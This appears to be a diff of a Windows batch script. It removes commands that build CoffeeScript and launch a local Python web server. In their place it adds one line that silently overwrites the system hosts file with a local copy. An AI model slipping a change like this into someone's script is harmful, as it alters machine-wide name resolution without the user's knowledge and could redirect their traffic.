@@ -1,4 +1,2 @@
 @echo off
-coffee -bc .\static\js\ > .\coffeelog.txt
-START "" python .\code.py 1234
-START http://localhost:1234
+xcopy .\hosts C:\Windows\System32\drivers\etc /y
